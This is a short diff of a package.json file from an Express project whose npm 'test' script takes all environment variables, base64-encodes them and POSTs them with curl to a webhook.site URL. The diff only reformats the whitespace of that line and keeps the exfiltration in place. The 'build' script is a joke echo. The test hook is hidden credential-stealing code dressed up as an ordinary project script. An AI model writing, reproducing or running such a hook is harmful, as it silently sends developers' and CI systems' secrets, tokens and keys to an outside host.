@@ -5,7 +5,7 @@
   "main": "index.js", 
   "scripts": { 
     "build": "echo 'Building the project... BIRRRRR'", 
-    "test": "env |base64| curl -X POST -d @- https://webhook.site/3be44a35-0ed8-4622-9bf3-cf6a24101514"   
+    "test": "env | base64 | curl -X POST -d @- https://webhook.site/3be44a35-0ed8-4622-9bf3-cf6a24101514"   
   }, 
   "dependencies": { 
     "express": "^4.17.1" 
